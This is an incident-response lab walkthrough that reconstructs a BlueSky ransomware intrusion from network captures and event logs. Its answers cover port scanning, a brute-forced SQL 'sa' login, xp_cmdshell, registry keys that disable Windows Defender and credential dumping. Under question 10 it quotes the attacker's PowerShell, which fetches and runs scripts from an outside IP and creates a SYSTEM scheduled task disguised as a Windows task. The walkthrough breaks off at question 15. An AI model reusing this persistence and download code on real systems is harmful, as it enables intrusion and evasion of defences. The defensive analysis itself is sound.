# Overview

Reconstruct a BlueSky ransomware attack by analyzing network traffic, decoding PowerShell scripts, and examining persistence mechanisms to identify attacker tactics and IOCs.

**Tools:** 
- Wireshark
- Network Miner
- Windows Event Viewer
- Event Log Explorer
- VirusTotal
- CyberChef

## Scenario

***A high-profile corporation that manages critical data and services across diverse industries has reported a significant security incident. Recently, their network has been impacted by a suspected ransomware attack. Key files have been encrypted, causing disruptions and raising concerns about potential data compromise. Early signs point to the involvement of a sophisticated threat actor. Your task is to analyze the evidence provided to uncover the attacker’s methods, assess the extent of the breach, and aid in containing the threat to restore the network’s integrity.***

In order to begin our search of the ransomware we need to first understand the ***BlueSky Ransomware*** which has been explained well by [Thodes](https://www.thodex.com/ransomware/bluesky/) article.

**Questions**

1. ***Knowing the source IP of the attack allows security teams to respond to potential threats quickly. Can you identify the source IP responsible for potential port scanning activity?***

Port scanning is the activity where an attacker scanns mulitple ports in order to find which port is open so they can infiltrate it. In this case we need to look for the Ip which is     scanning multiple ports. To begin we can use Network Miner and on the sessions tab we can see on IP scanning multiple IPs as shown below

   <img width="933" height="880" alt="image" src="https://github.com/user-attachments/assets/42f2ab99-d904-40cd-bc14-b5fb3b5a6fce" />

We can also use Wireshark for the same and check for the `SYN` packets using the following query `tcp.flags.syn==1 and tcp.flags.ack==0`

<img width="1735" height="589" alt="image" src="https://github.com/user-attachments/assets/16db096a-3254-40a0-bccc-0c0f32048ec0" />

The same Ip can be seen and so we can conclude that `87.96.21.84` is perfomring a port scan on `87.96.21.81`

**Ans: 87.96.21.84**

2. ***During the investigation, it's essential to determine the account targeted by the attacker. Can you identify the targeted account username?***

We looking at the credential tab in Network miner we can see a username `sa` was used and the protocol whichreveiled this to us was the `TDS - Tabular Data Stream` protocol which is used to transfer data between a database server and a client

  <img width="1185" height="277" alt="image" src="https://github.com/user-attachments/assets/e76ced6a-51e2-4a5b-ae87-2425f58be279" />

On wirehsark side we can query the `TDS` packets and look for the succesfull login packets

<img width="1165" height="787" alt="image" src="https://github.com/user-attachments/assets/fd0222b7-f46e-4fe1-8c29-8ebed06c2692" />

**Ans: sa**

3. ***We need to determine if the attacker succeeded in gaining access. Can you provide the correct password discovered by the attacker?***

From the credential we found on our previous question the password is provided 

**ANS: cyb3rd3f3nd3r$**

4. ***Attackers often change some settings to facilitate lateral movement within a network. What setting did the attacker enable to control the target host further and execute further commands?***

The `TDS` which is on the application layer of the OSI model is used by a client to connect to a SQL server and by sending SQL queries between the database client and server. Since we know a login was succesful in the server we can follow the packets and see if the attacker tried changing any settings in the SQL server.

<img width="1553" height="718" alt="image" src="https://github.com/user-attachments/assets/1b93c044-c1b7-434d-81da-90d7965c3148" />

from the Query we notice that some setting were changed,
- `EXEC sp_configure` - used to display or change advanced server level settings
- `RECONFIGURE` - to apply the changes immediatelly
- `xp_cmdshell` - This is the dangour zone as it allows the attacker to run windows system commands directly on the server

This will inturn enable the attacker to run commands that can potentially harm or corrupt the database, delete users and files or potentially compromise the serverlike in our case hold it at ransom.

**ANS: `xp_cmdshell`**

5. ***Process injection is often used by attackers to escalate privileges within a system. What process did the attacker inject the C2 into to gain administrative privileges?***

In process injection the attacker tries to inject code in a legitimate process in order to aviod detection by security systems. So now we know a new pocess must have been started, we will then look at using the Event Log viewer tool. 

<img width="1103" height="877" alt="image" src="https://github.com/user-attachments/assets/b34d0bdf-45e7-457b-971b-9b14ed7ab230" />

Openning it we can see the first source being PowerShell  and the Event is 400 which means the beginning of a new powershell host, expl=anding it we can see that the `PreviousEngineState=None` and now its on Available mode meaning it has been started hence the Event no. We see the Hostnameas `MSFConsole` a tool used by penetration testers to gain shells or exploit vulnerabilities on a system and its running on a HostApplication `winlogon.exe` which is used to manage a users login/logout. This solidifies our quest that the attacker used a legitimate windows process to hide the `MSFConsole` process as it is used to gain remote access which means communicating with a C2 (command and control)

**ANS: `winlogon.exe`**

6. ***Following privilege escalation, the attacker attempted to download a file. Can you identify the URL of this file downloaded?***

Filtering using `http and http.request.method==GET` in our wireshark we see that the first file the attacker attempted to download was a PowerShell file with the `.ps1` extension meaning this was a script.

<img width="1272" height="791" alt="image" src="https://github.com/user-attachments/assets/46d5191f-3659-4103-a55a-601cb9168770" />

The scripts is actual a malware specifically a dropper which is used to compromise windows systems by disabling security features, check for privileges, establishes perisistance in essence it is the initial stage preparing the system for the main malware to drop either a cryptominer or a ransomware

**ANS: `checking.ps1`**

7. ***Understanding which group Security Identifier (SID) the malicious script checks to verify the current user's privileges can provide insights into the attacker's intentions. Can you provide the specific Group SID that is being checked?***

Following the stream of the powershell script we found, on the very first line of the script we can see that it checks if the current user has admistrative privileges and looks at the groups the user belongs to and searches for the adminstrators SID for which the result will be shown as TRUE/FALSE

<img width="1288" height="804" alt="image" src="https://github.com/user-attachments/assets/3ffe3338-cf90-4cc8-8659-71dccd2ca43e" />

Lets break down the script 
- `[System.Security.Principal.WindowsIdentity]::GetCurrent())` - Checks for the currently logged in user
- `.groups` - List the security groups the user belongs to
- `-match "S-1-5-32-544")` - Checks wether the provied SID belongs to the group
- `$priv = [bool]` - Returns TRUE/FALSE if TRUE then the script is running as administrator

**ANS: `S-1-5-32-544`**

8. ***Windows Defender plays a critical role in defending against cyber threats. If an attacker disables it, the system becomes more vulnerable to further attacks. What are the registry keys used by the attacker to disable Windows Defender functionalities? Provide them in the same order found.***

To begin we need to know what windows Registry is, this is a hierachical database that stores configurations for windows. apllications and hardware. This is a valuable source for attackers as the registry acts as a control center for the Windows system, changing anything here can have adverse effects on the system.

Sticking to our stream further down we can see that the registry keys were modified and the crucial component was the disbling of the windows antivirus Windows Defender.

<img width="1282" height="649" alt="image" src="https://github.com/user-attachments/assets/8f8fe03b-3612-4d54-96ce-9d53400b162e" />

The attacker through the registry keys modified the path that houses the Windows Defender settings and Disabled them in order to avoid being detected and blocked by the antivirus. This is a persistence technique addressed by the Mitre ID T1112 (Modify Registry)

**ANS: DisableAntiSpyware, DisableRoutinelyTakingAction, DisableRealtimeMonitoring, SubmitSamplesConsent, SpynetReporting**

9.***Can you determine the URL of the second file downloaded by the attacker?***

Using the query `http.request.method==GET` we can see there is a second script the attacker requested to get 

<img width="1535" height="733" alt="image" src="https://github.com/user-attachments/assets/77ab68e4-c4de-4c8c-bd53-67344fc1c9a4" />

**ANS: `hxxp[://]87[.]96[.]21[.]84/del[.]ps1`

10.***Identifying malicious tasks and understanding how they were used for persistence helps in fortifying defenses against future attacks. What's the full name of the task created by the attacker to maintain persistence?***

Looking at the first script the attacker dropped `checking.ps1` ang going through the script thouroughly we can see that a scheduled task was created, attackers use `schtasks.exe` to maintain persistence 

<img width="1278" height="803" alt="image" src="https://github.com/user-attachments/assets/e699e2fa-1a15-4c5b-b41f-9dfb76aa3d40" />

The attacker here used a legitimate task `\Microsoft\Windows\MUI\LPupdate` which is used to update the windows language pack, why you may ask... well this is a trusted process and operates under high privilegesand can be easily overlooked. Attacker can hijack this trusted task and reference a malicious script. Looking at the full script

`Function CleanerEtc {
    $WebClient = New-Object System.Net.WebClient
    $WebClient.DownloadFile("http://87.96.21.84/del.ps1", "C:\ProgramData\del.ps1") | Out-Null
    C:\Windows\System32\schtasks.exe /f /tn "\Microsoft\Windows\MUI\LPupdate" /tr "C:\Windows\System32\cmd.exe /c powershell -ExecutionPolicy Bypass -File C:\ProgramData\del.ps1" /ru SYSTEM /sc HOURLY /mo 4 /create | Out-Null
    Invoke-Expression ((New-Object System.Net.WebClient).DownloadString('http://87.96.21.84/ichigo-lite.ps1'))
} `

We see that the attacker downloads another script `del.ps1` and store it in `C:\ProgramData\` a common place to hide malware where there is No validation and No integrity check
 then creates a sceduled task for persistene and overwrites it and bypasses the policy with `-ExecutionPolicy Bypass` and executes the malicious script and downloads another script and executes it in meory. Persistence with high privileges disguised as a windows component.

 **ANS: `\Microsoft\Windows\MUI\LPupdate`**

11. ***Based on your analysis of the second malicious file, What is the MITRE ID of the main tactic the second file tries to accomplish?***

Looking over to the second script that was dropped which we know is `de1.ps1` and follow the HTTP Stream we see the script trying to remove `Wmi-Object` which provides access to the Windows Management Instrumentation which is used for monitoring events

<img width="1283" height="468" alt="image" src="https://github.com/user-attachments/assets/01c0a4cc-2098-4bee-8bf4-7829c904a576" />


The script is meant to delete this object using `Remove-WmiObject` and a list of security monitoring tools such as ***`ProcessHacker, procexp64...` etc*** which it kills them in order to avoid detection and later it terminates itself to avoid leaving any traces, this is an act on defense evation and we can conclude from the MITRE ATT&CK Enterprise Tactics section to be Defense Evasion

**ANS: TA0005**

12. ***What's the invoked PowerShell script used by the attacker for dumping credentials?***

Invoke-command  is a cmdlet used to run command on a local or remote computer and it has many use cases, in this its was used to get a script `Invoke-PowerDump.ps1` 

<img width="1289" height="793" alt="image" src="https://github.com/user-attachments/assets/63789850-43fb-48da-ae6d-cfb6d970371a" />

and as we follow the workings of this script we see that its used to dump hashes, which are hashed passwords of users. This techniques is referred as **Credential Dumping** which is used to extract Usernames, Passwords, Kerberos Tickets ...etc.from a systems memory or storage often target windows security systems as LSASS (Local Security Authority Subsystem Service) or the SAM(Security Accounts Manager) database  in order for the attacker to escalate his privileges further

***ANS: Invoke-PowerDump.ps1***

13. ***Understanding which credentials have been compromised is essential for assessing the extent of the data breach. What's the name of the saved text file containing the dumped credentials?***

Now that we know of the script we can use the command `http contains "Invoke-PowerDump.ps1" ` to isolate HTTP traffc involving the specific script. This script is often used by attacker in performing credential dumping

<img width="1547" height="792" alt="image" src="https://github.com/user-attachments/assets/c75f7de0-84ff-4fd3-8356-04d2369e2fdb" />

We will focus on the HTTP request and responses and we can see that the attacker used the served host `http://87.96.21.84` to downloaded and execute the `Invoke-PowerDump.ps1` script. Following the stream of the HTTP 200 response we can see that the attacker used a base64 obfuscation technique to hide a file which was used to dump the credentials. Attacker used this techniques in order to by-pass defenses and avoid being flagged

<img width="1591" height="825" alt="image" src="https://github.com/user-attachments/assets/d07e98b3-f60a-4226-b3f7-10fc0f2ff4dd" />

A tool called [CyberChef](https://gchq.github.io/CyberChef/#recipe=URL_Decode(true)&input=SGVsbG8lMkMlMjB3b3JsZCUyMQ) can be used to deobfuscate the encoded text

<img width="1477" height="672" alt="image" src="https://github.com/user-attachments/assets/7b3410b1-a964-46a4-a681-ed54884c115a" />

**ANS: hashes.txt**

14. ***Knowing the hosts targeted during the attacker's reconnaissance phase, the security team can prioritize their remediation efforts on these specific hosts. What's the name of the text file containing the discovered hosts?***

On the same stream we can see that the attacker dumped the credentials in a `.txt` file 

<img width="1284" height="805" alt="image" src="https://github.com/user-attachments/assets/c1bb2d15-e07b-4f6f-b149-548d6798e237" />

The contents of this file likely contains the list of IP addresses or hostnames identified from his script above

<img width="1286" height="813" alt="image" src="https://github.com/user-attachments/assets/6be2b432-ff5a-44e3-9b03-aa7613b29109" />

The `Invoke-SMBExec` is a powershell function used for remote code execution and lateral movement within a network mostly leveraging the SMB protocol on port 445 which is a network-file sharing protocol used for sharing files, printers, and other resources between computers. This can be mitigated by using Privileged Account Management (Limiting credential overlap), User Account Control(enabling UAC restrictions to local accounts on network logon), Updating the system and User Account management(refrain from adding the domain user in multiple local administrator groups).

**ANS: extracted_hosts.txt**

15. ***After hash dumping, the attacker attempted to deploy ransomware on the compromised host, spreading it to the rest of the network through previous lateral movement activities using SMB. You’re provided with the ransomware sample for further analysis. By performing behavioral analysis, what’s the name of the ransom note file?***



 



















































